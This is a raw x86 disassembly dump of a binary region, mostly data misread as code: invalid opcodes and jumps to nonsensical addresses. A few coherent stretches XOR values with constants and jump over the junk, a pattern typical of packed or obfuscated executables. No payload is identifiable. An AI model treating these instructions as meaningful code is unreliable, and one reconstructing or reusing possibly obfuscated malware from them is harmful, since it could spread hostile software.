  40a86d:	and    ebx,DWORD PTR [eax+0x2f989437]
  40a873:	cmp    al,0xf8
  40a875:	imul   ebx,DWORD PTR [edi-0x7994e362],0xaf0368b8
  40a87f:	jle    0x40a87e
  40a881:	mov    ds:0xdb9b6cb2,eax
  40a886:	aam    0x14
  40a888:	sub    esp,DWORD PTR [esi+0x70]
  40a88b:	mov    bh,0xaf
  40a88d:	mov    ah,0x18
  40a88f:	cmc    
  40a890:	aas    
  40a891:	into   
  40a892:	cmc    
  40a893:	sti    
  40a894:	(bad)
  40a898:	jmp    0x40a851
  40a89a:	lds    ebx,FWORD PTR [edx+ecx*2]
  40a89d:	nop
  40a89e:	mov    ebx,0x32f9077d
  40a8a3:	cmp    eax,0x665219a2
  40a8a8:	lahf   
  40a8a9:	inc    BYTE PTR [esi-0x41]
  40a8ac:	loope  0x40a8bb
  40a8ae:	push   0x1d
  40a8b0:	pop    ebx
  40a8b1:	or     ebx,ebp
  40a8b3:	xlat   BYTE PTR ds:[ebx]
  40a8b4:	push   ecx
  40a8b5:	jno    0x40a8f8
  40a8b7:	(bad)  
  40a8b8:	ins    BYTE PTR es:[edi],dx
  40a8b9:	std    
  40a8ba:	push   cs
  40a8bb:	or     eax,DWORD PTR [esi-0x7d]
  40a8be:	jb     0x40a8ee
  40a8c0:	aad    0x91
  40a8c2:	push   ebx
  40a8c3:	lock mov edx,0x2d6c9fba
  40a8c9:	ret    0xfdc
  40a8cc:	add    DWORD PTR [edi+0x44965ab5],edx
  40a8d2:	sbb    al,BYTE PTR [ebp+0x7f9174d7]
  40a8d8:	jmp    FWORD PTR [edi]
  40a8da:	xchg   esp,eax
  40a8db:	mov    DWORD PTR [ebp+0x2d],ecx
  40a8de:	loopne 0x40a8aa
  40a8e0:	jge    0x40a8bf
  40a8e2:	scas   al,BYTE PTR es:[edi]
  40a8e3:	adc    al,0xc4
  40a8e5:	shl    BYTE PTR [eax-0x348d3f0f],1
  40a8eb:	mov    dh,0xd6
  40a8ed:	adc    dh,dl
  40a8ef:	fwait
  40a8f0:	in     eax,dx
  40a8f1:	lods   eax,DWORD PTR ds:[esi]
  40a8f2:	jb     0x40a880
  40a8f4:	push   esp
  40a8f5:	inc    edx
  40a8f6:	xchg   DWORD PTR [ecx-0x19c8568b],esp
  40a8fc:	stos   DWORD PTR es:[edi],eax
  40a8fd:	sbb    ecx,DWORD PTR [ebx+eax*4-0x54]
  40a901:	sbb    esi,DWORD PTR [ecx-0x56f1c5ce]
  40a907:	out    dx,eax
  40a908:	js     0x40a8ee
  40a90a:	clc    
  40a90b:	repnz scas al,BYTE PTR es:[edi]
  40a90d:	adc    esi,DWORD PTR [esi]
  40a90f:	ds mov dh,0xea
  40a912:	int    0x16
  40a914:	out    0xdb,al
  40a916:	xlat   BYTE PTR ds:[ebx]
  40a917:	xchg   ecx,eax
  40a918:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a919:	mov    edx,0x4860a53a
  40a91e:	inc    ecx
  40a91f:	sbb    eax,0x3889ae97
  40a924:	mov    eax,DWORD PTR [ebp-0x14]
  40a927:	mov    ebx,DWORD PTR [ebp-0x8]
  40a92a:	mov    ecx,0x7510850
  40a92f:	xor    eax,ecx
  40a931:	mov    esi,0x327298
  40a936:	jmp    0x40ac4f
  40a93b:	(bad)  
  40a93c:	xlat   BYTE PTR ds:[ebx]
  40a93d:	rcl    bh,1
  40a93f:	aad    0xd7
  40a941:	(bad)
  40a944:	xchg   ebx,eax
  40a945:	cdq    
  40a946:	add    DWORD PTR [ecx-0x252a30f3],esp
  40a94c:	cmp    DWORD PTR [eax+0x78],0x74
  40a950:	jle    0x40a9ca
  40a952:	js     0x40a9a7
  40a954:	jae    0x40a964
  40a956:	adc    ecx,DWORD PTR [esi]
  40a958:	ret    
  40a959:	out    dx,al
  40a95a:	xchg   esp,eax
  40a95b:	jno    0x40a992
  40a95d:	push   eax
  40a95e:	call   0x54be:0x81a63d4
  40a965:	inc    dl
  40a967:	sahf   
  40a968:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a969:	lods   al,BYTE PTR ds:[esi]
  40a96a:	je     0x40a929
  40a96c:	xor    al,0xe1
  40a96e:	sbb    edx,DWORD PTR [eax-0x3a96b0bd]
  40a974:	lea    edi,[ecx]
  40a976:	inc    edi
  40a977:	jbe    0x40a9e6
  40a979:	pop    es
  40a97a:	jne    0x40a90a
  40a97c:	mov    DWORD PTR [ebx-0x747eedf4],edi
  40a982:	xchg   DWORD PTR [ebx+0x41],esi
  40a985:	dec    eax
  40a986:	shr    DWORD PTR [ebx],0x9e
  40a989:	sbb    esp,DWORD PTR [edx]
  40a98b:	fdivrp st(0),st
  40a98d:	cmp    eax,0x17712393
  40a992:	mov    ebp,0xff59ae58
  40a997:	in     eax,dx
  40a998:	arpl   cx,sp
  40a99a:	jns    0x40a97b
  40a99c:	sub    BYTE PTR [eax-0x11],bh
  40a99f:	adc    esp,0x18fd61fe
  40a9a5:	(bad)  
  40a9a6:	fdivrp st(5),st
  40a9a8:	fimul  DWORD PTR [edi+0x728a77f6]
  40a9ae:	push   cs
  40a9af:	dec    edi
  40a9b0:	out    dx,al
  40a9b1:	inc    eax
  40a9b2:	fadd   DWORD PTR [edx-0x3fb8a1e2]
  40a9b8:	jb     0x40a9da
  40a9ba:	xchg   ebx,eax
  40a9bb:	xor    eax,0xd7e959fd
  40a9c0:	jbe    0x40aa0f
  40a9c2:	pop    edi
  40a9c3:	je     0x40a9e0
  40a9c5:	inc    ecx
  40a9c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a9c7:	leave  
  40a9c8:	out    0xcb,al
  40a9ca:	jns    0x40aa24
  40a9cc:	int3   
  40a9cd:	sbb    esp,esp
  40a9cf:	mov    esi,edx
  40a9d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a9d2:	lea    edi,[ecx+0x77]
  40a9d5:	lods   eax,DWORD PTR ds:[esi]
  40a9d6:	xchg   esp,eax
  40a9d7:	push   esp
  40a9d8:	mov    ebx,0xe4f44770
  40a9dd:	fwait
  40a9de:	sub    DWORD PTR ds:0xc795d6bd,edx
  40a9e4:	das    
  40a9e5:	retf   0x549c
  40a9e8:	lods   al,BYTE PTR ds:[esi]
  40a9e9:	(bad)  
  40a9ea:	xchg   ebp,eax
  40a9eb:	inc    bh
  40a9ed:	daa    
  40a9ee:	pop    ds
  40a9ef:	xchg   ebp,eax
  40a9f0:	sbb    ebx,DWORD PTR [edx-0x45]
  40a9f3:	and    eax,0xf9f38497
  40a9f8:	fldenv [eax+edi*8+0x32]
  40a9fc:	mov    cl,0x9
  40a9fe:	add    dl,bh
  40aa00:	pop    eax
  40aa01:	scas   al,BYTE PTR es:[edi]
  40aa02:	ds cwde 
  40aa04:	aaa    
  40aa05:	repz repz loop 0x40a9d7
  40aa09:	in     al,0xf3
  40aa0b:	or     BYTE PTR [eax*1-0x372aea6c],ch
  40aa12:	enter  0xe0d3,0xbf
  40aa16:	gs push ebx
  40aa18:	jne    0x40aa5b
  40aa1a:	push   0x33070bcf
  40aa1f:	cmp    al,BYTE PTR [edx-0x5ebe56ce]
  40aa25:	add    DWORD PTR [eax+0x50],eax
  40aa28:	adc    BYTE PTR [esi-0x744b41d8],ah
  40aa2e:	inc    ebx
  40aa2f:	mov    ebp,0x175b6c43
  40aa34:	lods   eax,DWORD PTR ds:[esi]
  40aa35:	mov    esp,0xf595e793
  40aa3a:	gs push ss
  40aa3c:	and    bh,bl
  40aa3e:	adc    esi,DWORD PTR [esi+0x2f]
  40aa41:	(bad)  
  40aa42:	aaa    
  40aa43:	(bad)  
  40aa45:	sbb    edi,DWORD PTR [ebx+0x2d3946e9]
  40aa4b:	in     al,dx
  40aa4c:	push   0x39515a0d
  40aa51:	call   0x703f:0x44ed30d9
  40aa58:	ret    0x2c87
  40aa5b:	or     eax,0xcbbb174
  40aa60:	dec    ebx
  40aa61:	imul   esi,ebx,0xdfc3cd3e
  40aa67:	jecxz  0x40aa51
  40aa69:	mov    bl,0x4f
  40aa6b:	out    0x17,al
  40aa6d:	rcr    BYTE PTR [ebx],cl
  40aa6f:	dec    esp
  40aa70:	outs   dx,DWORD PTR ds:[esi]
  40aa71:	mov    bl,0x49
  40aa73:	dec    edi
  40aa74:	in     al,dx
  40aa75:	dec    edx
  40aa76:	pop    edx
  40aa77:	inc    eax
  40aa78:	jl     0x40aac9
  40aa7a:	(bad)
  40aa7d:	and    al,al
  40aa7f:	inc    ebx
  40aa80:	fstp   TBYTE PTR [eax-0x1f810c6f]
  40aa86:	xchg   DWORD PTR [edx+0xc],esi
  40aa89:	fld    st(2)
  40aa8b:	and    ebx,DWORD PTR [ecx-0x72]
  40aa8e:	call   0xdd023af2
  40aa93:	add    dl,BYTE PTR [ecx+0x58]
  40aa96:	add    BYTE PTR [ecx+0x74],ah
  40aa99:	out    dx,al
  40aa9a:	retf   
  40aa9b:	fild   QWORD PTR [ebp+0x5b]
  40aa9e:	xor    DWORD PTR [ecx],ecx
  40aaa0:	mov    ds:0x72181fd0,al
  40aaa5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aaa6:	jp     0x40aa9b
  40aaa8:	int    0xe8
  40aaaa:	aam    0x9f
  40aaac:	dec    edi
  40aaad:	loope  0x40ab08
  40aaaf:	mov    ch,0xa2
  40aab1:	mov    ah,BYTE PTR [edx+0x33]
  40aab4:	mov    ebp,0x7cebdfe2
  40aab9:	dec    ebp
  40aaba:	out    dx,al
  40aabb:	add    eax,0x51c3eb4e
  40aac0:	push   es
  40aac1:	sub    edx,DWORD PTR [ecx-0x43d54220]
  40aac7:	pop    eax
  40aac8:	imul   BYTE PTR [edi-0x55735893]
  40aace:	sahf   
  40aacf:	fcmovnb st,st(1)
  40aad1:	xchg   esp,eax
  40aad2:	imul   eax,DWORD PTR [ebx],0x56
  40aad5:	sbb    DWORD PTR [edi],0x22ac7487
  40aadb:	sbb    edx,DWORD PTR [edx-0x2e]
  40aade:	test   DWORD PTR ds:0x8cc58073,ebx
  40aae4:	in     al,dx
  40aae5:	mov    edx,DWORD PTR [ebx-0x7a179920]
  40aaeb:	fnsave [eax]
  40aaed:	xchg   ebx,eax
  40aaee:	jp     0x40aad5
  40aaf0:	sbb    BYTE PTR [esi+0x6e],ah
  40aaf3:	xchg   DWORD PTR ds:0xa04486ed,ebx
  40aaf9:	enter  0x3892,0x91
  40aafd:	leave  
  40aafe:	pop    ds
  40aaff:	dec    esi
  40ab00:	and    al,0xb7
  40ab02:	test   BYTE PTR [edi+0x6c],dl
  40ab05:	call   0x66bc680a
  40ab0a:	aaa    
  40ab0b:	(bad)  
  40ab0c:	dec    ebx
  40ab0d:	cld    
  40ab0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab0f:	jecxz  0x40ab3f
  40ab11:	xchg   esi,eax
  40ab12:	cmp    al,0xf2
  40ab14:	cmp    DWORD PTR [edx+0xe2d1b65],esi
  40ab1a:	loop   0x40aaee
  40ab1c:	and    ebp,ecx
  40ab1e:	mov    DWORD PTR [ebp+0x36d0faab],ebp
  40ab24:	in     eax,dx
  40ab25:	sbb    DWORD PTR [edi-0x3d653110],eax
  40ab2b:	jge    0x40aaec
  40ab2d:	imul   ebp,DWORD PTR [esi+0xf],0x8
  40ab31:	sub    eax,0x553ccf51
  40ab36:	adc    eax,esp
  40ab38:	or     DWORD PTR [edi-0x3d],edi
  40ab3b:	shl    DWORD PTR [edi+0x25648cbd],1
  40ab41:	add    eax,esp
  40ab43:	mov    ds:0x620d7090,eax
  40ab48:	cmp    DWORD PTR [ecx+0x41],esi
  40ab4b:	or     BYTE PTR [eax],bl
  40ab4d:	iret   
  40ab4e:	out    0x14,al
  40ab50:	and    al,ch
  40ab52:	and    cl,BYTE PTR [edx-0xd0025d2]
  40ab58:	int3   
  40ab59:	jnp    0x40ab9c
  40ab5b:	retf   
  40ab5c:	xchg   esi,eax
  40ab5d:	mov    edi,0x2a3c7dbf
  40ab62:	push   ss
  40ab63:	mov    eax,0x8d398d3a
  40ab68:	push   edi
  40ab69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab6a:	jmp    0x40ab5e
  40ab6c:	mov    WORD PTR ds:0x96dd30a,es
  40ab72:	popa   
  40ab73:	pop    ebx
  40ab74:	jmp    0x932f11b7
  40ab79:	and    al,0xb0
  40ab7b:	push   ss
  40ab7c:	xor    eax,0x63fc3feb
  40ab81:	in     eax,dx
  40ab82:	mov    al,0xca
  40ab84:	in     al,dx
  40ab85:	(bad)  
  40ab86:	mov    WORD PTR [ebx-0x56],gs
  40ab89:	gs push edx
  40ab8b:	repnz sbb BYTE PTR [ecx],bh
  40ab8e:	dec    ebp
  40ab8f:	scas   al,BYTE PTR es:[edi]
  40ab90:	stos   BYTE PTR es:[edi],al
  40ab91:	push   esp
  40ab92:	sbb    cl,BYTE PTR [esi]
  40ab94:	add    BYTE PTR [edi],0xaf
  40ab97:	std    
  40ab98:	popa   
  40ab99:	pop    es
  40ab9a:	das    
  40ab9b:	and    eax,DWORD PTR [esp+eiz*8]
  40ab9e:	test   eax,0xf57f35e4
  40aba3:	(bad)  
  40aba5:	dec    ecx
  40aba6:	call   0xdf9e:0xc72653f0
  40abad:	clc    
  40abae:	push   edi
  40abaf:	lods   eax,DWORD PTR ds:[esi]
  40abb0:	lods   eax,DWORD PTR ds:[esi]
  40abb1:	popf   
  40abb2:	fs sti 
  40abb4:	adc    BYTE PTR [edx+0x9],al
  40abb7:	mov    dh,0x73
  40abb9:	(bad)  
  40abba:	mov    esi,0x46cf14c9
  40abbf:	xchg   edi,eax
  40abc0:	cmp    al,BYTE PTR [esi+ecx*4-0x57]
  40abc4:	repz inc ebp
  40abc6:	fsubr  DWORD PTR [esi+0x734d08fc]
  40abcc:	jmp    0xebe8d1e3
  40abd1:	repnz leave 
  40abd3:	cmc    
  40abd4:	ja     0x40ab64
  40abd6:	out    dx,eax
  40abd7:	dec    edi
  40abd8:	adc    al,0xfe
  40abda:	mov    BYTE PTR [di+0x52c1],0xa2
  40abe0:	push   es
  40abe1:	jmp    0x3d18b58a
  40abe6:	retf   
  40abe7:	sub    al,BYTE PTR [edx+0x7c]
  40abea:	ror    BYTE PTR [edx+0xd54a2f4],1
  40abf0:	cmp    BYTE PTR fs:[esi+eax*2+0x4f],dh
  40abf5:	sbb    al,0x1f
  40abf7:	and    ebx,DWORD PTR [eax+0x250860d9]
  40abfd:	int    0xa6
  40abff:	cdq    
  40ac00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac01:	jnp    0x40ac40
  40ac03:	jb     0x40abca
  40ac05:	hlt    
  40ac06:	adc    al,BYTE PTR [edi+eiz*1+0x69]
  40ac0a:	mov    al,BYTE PTR [edx]
  40ac0c:	dec    edi
  40ac0d:	lea    eax,[edi-0x5]
  40ac10:	(bad)  
  40ac11:	(bad)  
  40ac12:	call   0x88b242be
  40ac17:	jnp    0x40abd4
  40ac19:	mov    ch,0x12
  40ac1b:	(bad)  
  40ac1c:	test   DWORD PTR [edx+ecx*2+0x14cd5419],0x536890d9
  40ac27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac28:	sar    DWORD PTR [ecx],1
  40ac2a:	mov    eax,ds:0x35366d6e
  40ac2f:	adc    eax,0xb176a4b1
  40ac34:	cmp    al,0x12
  40ac36:	jmp    0x51f45ce
  40ac3b:	lods   eax,DWORD PTR ds:[esi]
  40ac3c:	retf   
  40ac3d:	fcom   DWORD PTR [edi-0x4878e355]
  40ac43:	(bad)  
  40ac44:	dec    edi
  40ac45:	adc    bh,BYTE PTR [edi+0x4b]
  40ac48:	or     ebp,edx
  40ac4a:	jnp    0x40abdd
  40ac4c:	sbb    BYTE PTR [eax-0x18],bl
  40ac4f:	xor    ebx,ecx
  40ac51:	xor    edx,edx
  40ac53:	add    eax,esi
  40ac55:	add    ebx,esi
  40ac57:	div    ebx
  40ac59:	mov    edx,DWORD PTR [ebp-0x20]
  40ac5c:	mov    DWORD PTR [ebp-0x2c],0x4f35
  40ac63:	cmp    eax,DWORD PTR [edx]
  40ac65:	je     0x40c955
  40ac6b:	mov    DWORD PTR [ebp-0xc],0x705fd8e
  40ac72:	lea    eax,[ebp-0xc]
  40ac75:	mov    DWORD PTR [ebp-0x10],eax
  40ac78:	mov    eax,DWORD PTR [ebp-0x10]
  40ac7b:	jmp    0x40af94
  40ac80:	aas    
  40ac81:	aas    
  40ac82:	iret   
  40ac83:	(bad)  
  40ac84:	iret   
  40ac85:	xlat   BYTE PTR ds:[ebx]
  40ac86:	xlat   BYTE PTR ds:[ebx]
  40ac87:	(bad)  
  40ac88:	fist   WORD PTR [eax]
  40ac8a:	push   eax
  40ac8b:	psubsw mm0,mm5
  40ac8e:	jge    0x40ac7c
  40ac90:	(bad)  
  40ac91:	cmp    BYTE PTR [eax+0x78],0x74
  40ac95:	jle    0x40ad0f
  40ac97:	js     0x40ac68
  40ac99:	dec    edx
  40ac9a:	xor    DWORD PTR [ebx],ebx
  40ac9c:	lds    edi,FWORD PTR [edi-0xd16921]
  40aca2:	mov    cl,0x2a
  40aca4:	daa    
  40aca5:	sub    DWORD PTR [ecx-0x3d885948],0xffffff8a
  40acac:	popa   
  40acad:	adc    cl,BYTE PTR [ecx-0x50]
  40acb0:	xor    bh,0x7e
  40acb3:	popf   
  40acb4:	cli    
  40acb5:	sti    
  40acb6:	mov    eax,ss:0xfcfd01a2
  40acbc:	fisubr DWORD PTR [ebx+0x77]
  40acbf:	outs   dx,BYTE PTR ds:[esi]
  40acc0:	sar    DWORD PTR es:[edi+0x9],1
  40acc4:	sub    al,0x9b
  40acc6:	and    eax,0x35498286
  40accb:	cs icebp 
  40accd:	(bad)  
  40acce:	mov    edx,db2
  40acd1:	mov    ebp,0xfd07f30c
  40acd6:	pop    ebp
  40acd7:	add    esp,DWORD PTR [edx+0x3e]
  40acda:	repnz push ecx
  40acdc:	enter  0x8454,0x22
  40ace0:	jns    0x40ad15
  40ace2:	dec    ecx
  40ace3:	imul   edi,DWORD PTR [ecx+0x34],0x29
  40ace7:	or     al,0x74
  40ace9:	int    0x98
  40aceb:	sub    DWORD PTR ds:0x1b16fedd,0xea4cb62d
  40acf5:	xchg   esp,eax
  40acf6:	rcl    ecx,1
  40acf8:	out    dx,al
  40acf9:	pop    DWORD PTR [ebx+edi*1]
  40acfc:	sub    al,0x11
  40acfe:	sub    eax,0x80341d76
  40ad03:	das    
  40ad04:	sub    eax,0xe09217dc
  40ad09:	push   eax
  40ad0a:	sub    ecx,DWORD PTR [ecx-0x43]
  40ad0d:	pop    edi
  40ad0e:	call   0xa8eebbed
  40ad13:	push   eax
  40ad14:	adc    al,0xc0
  40ad16:	(bad)
  40ad19:	shl    ebp,0x8
  40ad1c:	sub    BYTE PTR [esi],0xe1
  40ad1f:	(bad)  
  40ad20:	jg     0x40ace3
  40ad22:	adc    DWORD PTR [ebx+ebx*2-0x43eaf505],edi
  40ad29:	push   ecx
  40ad2a:	je     0x40acb9
  40ad2c:	cld    
  40ad2d:	pushf  
  40ad2e:	jmp    0x40ada3
  40ad30:	popa   
  40ad31:	and    bh,BYTE PTR [esi]
  40ad33:	ja     0x40ad4a
  40ad35:	add    ebp,esp
  40ad37:	mov    dl,0x17
  40ad39:	mov    dl,0xe9
  40ad3b:	add    ebp,DWORD PTR [ebx+0x6c]
  40ad3e:	cmp    eax,0x52048d70
  40ad43:	xor    ecx,DWORD PTR [esi+0x76]
  40ad46:	addr16 icebp 
  40ad48:	addr16 push edx
  40ad4a:	sahf   
  40ad4b:	cmp    bh,BYTE PTR [edx]
  40ad4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad4e:	mov    ebx,DWORD PTR cs:[esi+0xe402508]
  40ad55:	mov    ebp,0x93aedfe9
  40ad5a:	in     eax,dx
  40ad5b:	test   DWORD PTR [ecx],0x9c3d8e08
  40ad61:	push   0x45
  40ad63:	mov    eax,0x93faf19e
  40ad68:	pop    es
  40ad69:	fwait
  40ad6a:	mov    esp,0x227c9f8
  40ad6f:	test   eax,0xbfca1cb8
  40ad74:	jle    0x40ad37
  40ad76:	cwde   
  40ad77:	pop    ebp
  40ad78:	inc    esi
  40ad79:	adc    BYTE PTR [edi+0x3b3eb25d],bl
  40ad7f:	mov    edi,0xefd0368b
  40ad84:	mov    eax,ds:0xecb0d4cf
  40ad89:	mov    ebx,0xfd8f90b8
  40ad8e:	push   ebx
  40ad8f:	jbe    0x40adf7
  40ad91:	pop    eax
  40ad92:	inc    edx
  40ad93:	dec    eax
  40ad94:	stos   DWORD PTR es:[edi],eax
  40ad95:	or     eax,0xdae378ad
  40ad9a:	mov    WORD PTR [ecx+0x58],es
  40ad9d:	loope  0x40ad9f
  40ad9f:	cmc    
  40ada0:	(bad)  
  40ada1:	lods   eax,DWORD PTR ds:[esi]
  40ada2:	mov    ah,0x5a
  40ada4:	inc    eax
  40ada5:	aaa    
  40ada6:	sar    bh,1
  40ada8:	in     eax,dx
  40ada9:	ficomp DWORD PTR [ecx]
  40adab:	cmp    eax,0x256a5a93
  40adb0:	std    
  40adb1:	std    
  40adb2:	imul   ebx,ecx,0xe018ef0e
  40adb8:	mov    esi,0x902ea229
  40adbd:	je     0x40ada6
  40adbf:	xchg   esi,eax
  40adc0:	into   
  40adc1:	cmp    eax,0x19acf856
  40adc6:	loopne 0x40add0
  40adc8:	test   DWORD PTR [ebx+esi*1-0x33],esi
  40adcc:	sbb    edi,0x49acf3ff
  40add2:	xor    eax,0xbc1912c9
  40add7:	push   edx
  40add8:	adc    ecx,eax
  40adda:	fist   DWORD PTR [esi+eiz*4-0x23]
  40adde:	or     ebx,DWORD PTR [ecx-0x6c08f4b5]
  40ade4:	and    bh,BYTE PTR [edx+0x2e8d0a03]
  40adea:	sbb    ch,BYTE PTR [esi]
  40adec:	cmp    BYTE PTR [esi+0x3a],bl
  40adef:	mov    esi,0x761207e4
  40adf4:	mov    ch,al
  40adf6:	addr16 mov edx,fs
  40adf9:	retf   0x6335
  40adfc:	bound  ebx,QWORD PTR [eax+ecx*1-0x2f1630ac]
  40ae03:	jns    0x40ad8a
  40ae05:	xchg   ebp,eax
  40ae06:	std    
  40ae07:	jb     0x40add6
  40ae09:	jge    0x40ae72
  40ae0b:	out    0x29,al
  40ae0d:	dec    esp
  40ae0e:	pop    ss
  40ae0f:	fsubrp st(6),st
  40ae11:	int3   
  40ae12:	enter  0xd1eb,0x7
  40ae16:	test   eax,0x4042c2ab
  40ae1b:	xor    BYTE PTR [edx-0x4e12e395],bh
  40ae21:	mov    dh,0x9
  40ae23:	cmc    
  40ae24:	mov    edx,0xaf93f19
  40ae29:	jne    0x40ae16
  40ae2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae2c:	dec    eax
  40ae2d:	call   0xc5a7151b
  40ae32:	fdiv   QWORD PTR [eax]
  40ae34:	mov    BYTE PTR [edi],dh
  40ae36:	fisttp DWORD PTR [ecx+0x5c40beca]
  40ae3c:	or     bh,BYTE PTR [edi]
  40ae3e:	and    ah,cl
  40ae40:	jmp    0x1775:0xc5387bd5
  40ae47:	cmc    
  40ae48:	sbb    DWORD PTR [edx-0xdde65f8],0xffffffad
  40ae4f:	xchg   ebp,eax
  40ae50:	(bad)  
  40ae51:	enter  0x61df,0xc2
  40ae55:	and    eax,0x455da2d9
  40ae5a:	pop    ebx
  40ae5b:	shl    DWORD PTR [ecx-0x23],cl
  40ae5e:	xchg   ebp,eax
  40ae5f:	sbb    al,0x7f
  40ae61:	aam    0x80
  40ae63:	jge    0x40ae32
  40ae65:	sub    eax,0x5ffdb3da
  40ae6a:	add    al,0x3c
  40ae6c:	jle    0x40aeb1
  40ae6e:	mov    dl,0xd6
  40ae70:	push   ebp
  40ae71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae72:	sbb    eax,DWORD PTR [ecx-0x53]
  40ae75:	daa    
  40ae76:	or     cl,BYTE PTR [ecx+0x45583c0d]
  40ae7c:	ds (bad) 
  40ae7f:	xchg   ebx,eax
  40ae80:	out    0x46,eax
  40ae82:	mov    edx,0x33be3275
  40ae87:	shr    DWORD PTR [ebx],1
  40ae89:	fwait
  40ae8a:	out    0xd0,al
  40ae8c:	pop    ss
  40ae8d:	(bad)  
  40ae8e:	rcl    BYTE PTR ds:0x7303aa87,cl
  40ae94:	xor    eax,esp
  40ae96:	sahf   
  40ae97:	clc    
  40ae98:	repz popf 
  40ae9a:	push   edx
  40ae9b:	lahf   
  40ae9c:	mov    edi,0xe4b4c848
  40aea1:	pop    eax
  40aea2:	push   edi
  40aea3:	int    0x97
  40aea5:	adc    BYTE PTR [eax-0x2818b5d9],bh
  40aeab:	shl    DWORD PTR [ebx+esi*1],1
  40aeae:	lock mov edi,0x8b113b24
  40aeb4:	dec    ebp
  40aeb5:	repnz jecxz 0x40af12
  40aeb8:	dec    esi
  40aeb9:	or     al,0xe0
  40aebb:	lods   eax,DWORD PTR ds:[esi]
  40aebc:	ficom  DWORD PTR [ebx-0x50]
  40aebf:	sub    al,0xc9
  40aec1:	cdq    
  40aec2:	push   0x7d28baa9
  40aec7:	int3   
  40aec8:	mov    ebp,0x7d33cdb6
  40aecd:	mov    dl,0x24
  40aecf:	test   BYTE PTR [ecx+0x5bc0fda3],ch
  40aed5:	mov    edx,0x8317280c
  40aeda:	fistp  DWORD PTR [ecx+0x73]
  40aedd:	xor    ebx,edx
  40aedf:	xor    DWORD PTR [ebx+0x15],0x61f93fa0
  40aee6:	and    ecx,DWORD PTR [ecx+0x77]
  40aee9:	rol    esi,cl
  40aeeb:	xchg   BYTE PTR [eax],dh
  40aeed:	xchg   ebx,eax
  40aeee:	inc    esp
  40aeef:	and    BYTE PTR [esi],ah
  40aef1:	pop    DWORD PTR [esi+0x4f]
  40aef4:	push   eax
  40aef5:	push   edx
  40aef6:	or     ecx,DWORD PTR [ebp-0x2bef8a8e]
  40aefc:	sub    DWORD PTR [esi+0x2ade81d2],0x345f99b8
  40af06:	out    dx,eax
  40af07:	or     ebx,ebx
  40af09:	shl    BYTE PTR [esi-0x26d30657],cl
  40af0f:	mov    edi,0x2e85f97c
  40af14:	mov    WORD PTR [ecx+edi*2+0x25ad1523],gs
  40af1b:	les    edx,FWORD PTR [esi-0x15d8e650]
  40af21:	popa   
  40af22:	les    edx,FWORD PTR [eax]
  40af24:	out    0xb8,eax
  40af26:	lock shl BYTE PTR [edx],cl
  40af29:	cmc    
  40af2a:	imul   ecx,esi,0xffffffa2
  40af2d:	cmp    bl,al
  40af2f:	outs   dx,DWORD PTR ds:[esi]
  40af30:	cwde   
  40af31:	inc    eax
  40af32:	loope  0x40af4e
  40af34:	adc    cl,BYTE PTR ds:0x1ca875aa
  40af3a:	or     eax,0xfe69daa1
  40af3f:	in     al,dx
  40af40:	mov    ecx,0x87793cb1
  40af45:	test   BYTE PTR [edi+edx*1+0xcfa2b73],0x9d
  40af4d:	mov    esi,0xa99f1ca8
  40af52:	bnd addr16 call 0x4afffa76
  40af59:	rcl    DWORD PTR [eax+0x24],cl
  40af5c:	jmp    0x33398967
  40af61:	mov    BYTE PTR [esi+0x66c3db61],0x13
  40af68:	sub    al,0xbc
  40af6a:	push   edx
  40af6b:	push   eax
  40af6c:	bswap  edx
  40af6e:	shl    DWORD PTR [edi],cl
  40af70:	gs daa 
  40af72:	stos   BYTE PTR es:[edi],al
  40af73:	rol    eax,cl
  40af75:	pop    esi
  40af76:	bound  ebx,QWORD PTR [esi-0x52]
  40af79:	sub    DWORD PTR [ebp+0x454b6888],esi
  40af7f:	pop    edi
  40af80:	ins    BYTE PTR es:[edi],dx
  40af81:	or     dh,BYTE PTR ss:[ebp-0x45f11680]
  40af88:	xchg   edi,eax
  40af89:	or     al,0xfc
  40af8b:	jge    0x40afe7
  40af8d:	addr16 (bad) 
  40af8f:	jmp    0x40afe5
  40af91:	sub    BYTE PTR ds:0x69108b4a,0xd2
  40af98:	in     eax,dx
  40af99:	test   eax,0x1089f89e
  40af9e:	mov    eax,DWORD PTR [ebp-0xc]
  40afa1:	jmp    0x40b2ba
  40afa6:	sar    DWORD PTR ds:0xc9d9c1c9,cl
  40afac:	fcmovne st,st(5)
  40afae:	mov    bl,0x22
  40afb0:	fsub   st(2),st
  40afb2:	(bad)  
  40afb3:	out    dx,eax
  40afb4:	push   es
  40afb5:	sbb    al,0xd2
  40afb7:	test   DWORD PTR [eax+0x78],edi
  40afba:	je     0x40b03a
  40afbc:	js     0x40b036
  40afbe:	cld    
  40afbf:	ins    BYTE PTR es:[edi],dx
  40afc0:	mov    BYTE PTR [ebx+0x3795d074],ch
  40afc6:	shl    DWORD PTR ds:0xd13bb195,cl
  40afcc:	mov    edx,0x507031d7
  40afd1:	adc    edx,DWORD PTR [esi-0x18]
  40afd4:	jmp    0x243aee8c
  40afd9:	into   
  40afda:	out    0x84,eax
  40afdc:	std    
  40afdd:	or     dh,BYTE PTR [edi+0x3a99bffa]
  40afe3:	call   0xcc66:0x6fa8d1f8
  40afea:	sbb    eax,0x8dc14bdd
  40afef:	and    dl,bl
  40aff1:	test   al,0xff
  40aff3:	dec    esp
  40aff4:	cmp    BYTE PTR [ecx+0xe8c2f92],0x71
  40affb:	inc    ecx
  40affc:	mov    esp,0x6f7acc34
  40b001:	ret    0x250e
  40b004:	inc    ebp
  40b005:	fld    DWORD PTR [edi+0x72]
  40b008:	xlat   BYTE PTR ds:[ebx]
  40b009:	dec    esp
  40b00a:	test   eax,0xb3eaf556
  40b00f:	xor    ebx,edi
  40b011:	add    al,0x70
  40b014:	div    DWORD PTR [ebp-0x21]
  40b017:	push   cs
